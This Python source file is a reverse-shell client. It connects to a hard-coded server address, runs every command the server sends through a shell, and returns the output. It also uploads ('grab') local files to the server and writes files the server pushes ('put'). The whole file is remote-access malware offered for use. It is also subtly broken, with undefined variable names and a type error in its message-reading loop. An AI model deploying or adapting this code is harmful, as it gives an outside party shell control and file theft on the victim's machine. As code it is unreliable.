#!/usr/bin/env python3
import socket
import os
import subprocess
import pathlib
import tqdm
import time

#############################
## ========  Config  ========
PORT   = 5052         ## CONFIGURE THIS (TODO)
SERVER = '10.96.10.191'  ## CONFIGURE THIS (TODO)
## --------------------------
ADDR = (SERVER, PORT)
FORMAT = 'utf-8'
HEADER = 64
SEPARATOR = "<SEPARATOR>"
BUFFER_SIZE = 4096 # send 4096 bytes each time step
DISCONNECT_MESSAGE = "exit"
#############################

## ========  Utils  =========
def snd_msg(conn, msg):
    bytes_left = len(msg)
    cur_pos = 0
    
    byts_left_msg = str(bytes_left).encode(FORMAT)
    conn.send(bytes_left_msg)

    while bytes_left > 0:
        if BUFFER_SIZE < bytes_left:
            buf_msg = msg[cur_pos : (cur_pos + BUFFER_SIZE)]
            cur_pos = cur_pos + BUFFER_SIZE
        else:
            buf_msg = msg[cur_pos : (cur_pos + bytes_left)]
            cur_pos = cur_pos + bytes_left
            
        message = buf_msg
        length = str(len(message)).encode(FORMAT)
        length += b' ' * (HEADER - len(length))
        conn.send(length)
        conn.send(message)
        bytes_left = byte_left - len(buf_msg)

def get_msg(conn):
    msg_length = int(conn.recv(HEADER).decode(FORMAT))
    bytes_left = msg_length
    msg = ""

    while bytes_left > 0:
        bytes_to_read = conn.recv(HEADER).decode(FORMAT)
        msg = msg + conn.recv(msg_length).decode(FORMAT)    
        bytes_left = bytes_left - bytes_to_read

    return msg

def snd_file(conn, filename):
    try:
        filesize = os.path.getsize(filename)
    except:
        return f"{filename} does not exist."

    snd_msg(conn, f"{filename}{SEPARATOR}{filesize}")
    progress = tqdm.tqdm(range(filesize), f"Sending {filename}", unit="B", unit_scale=True, unit_divisor=1024)
    bytes_left = filesize

    with open(filename, 'rb') as f:
        while bytes_left > 0:
            # read the bytes from the file
            if bytes_left > BUFFER_SIZE:
                bytes_to_read = BUFFER_SIZE
            else:
                bytes_to_read = bytes_left
            bytes_read = f.read(bytes_to_read)
            bytes_left = bytes_left - bytes_to_read
            # we use sendall to assure transimission in
            # busy networks
            conn.sendall(bytes_read)
            # update the progress bar
            progress.update(len(bytes_read))
    progress.close()
    f.close()
    return "SUCCESS"

def get_file(conn):
    # receive the file infos
    # receive using client socket, not server socket
    received = get_msg(conn)
    filename, filesize = received.split(SEPARATOR)
 
    # convert to integer
    filesize = int(filesize)
 
    # start receiving the file from the socket
    # and writing to the file stream
    progress = tqdm.tqdm(range(filesize), f"Receiving {filename}.", unit="B", unit_scale=True, unit_divisor=1024)
    bytes_left = filesize
    with open(filename, "wb") as f:
        while bytes_left > 0:
            if bytes_left < BUFFER_SIZE:
                bytes_to_write = bytes_left
            else:
                bytes_to_write = BUFFER_SIZE
            # read 1024 bytes from the socket (receive)
            bytes_read = conn.recv(bytes_to_write)
            #print(bytes_read)
            bytes_left = bytes_left - bytes_to_write
            #print(f'Bytes left {str(bytes_left)}')
            # write to the file the bytes we just received
            f.write(bytes_read)
            # update the progress bar
            progress.update(len(bytes_read))
    progress.close()
    f.close()
    return "SUCCESS"
## ============ End Utils ================

## ========= Setup ==========
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(ADDR)

## ========= Functions =====
def execute_command(conn, cmd_str):
    try:
        proc = subprocess.Popen(cmd_str, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except:
        print("Command failed " + cmd_str)
    stdoutput = (proc.stdout.read() + proc.stderr.read()).decode()
    snd_msg(conn, stdoutput)

def listen_to_server(conn):
    print(f"Connected to {SERVER}")
    connected = True
    while connected:
        # Retrieve Message from server
        msg = get_msg(client)

        if msg == DISCONNECT_MESSAGE:
            connected = False

        ## Cd
        elif msg[:2] == "cd":
            try:
                abs_path = os.path.abspath(os.path.join(os.getcwd(), msg[3:]))
                os.chdir(abs_path)
                snd_msg(conn, os.getcwd())
            except:
                snd_msg(conn, "Failed to change directory.")

        ## Put
        elif msg[:3] == "put":
            get_file(client)
        
        ## Grab
        elif msg[:4] == "grab":
            filename = get_msg(client)
            try:
                filesize = os.path.getsize(filename)
            except:
                snd_msg(client, f"Couldn't open {filename}.")
                continue
            
            snd_msg(client, f"SUCCESS")
            snd_file(client, filename) ## Sends the file to the server

        ## Close
        elif msg[:5] == "close":
            client.close()
            print("Killed by server.")
            connected = False

        else:
            execute_command(conn, msg)
    conn.close()

## ======== Client-Start ========
listen_to_server(client)
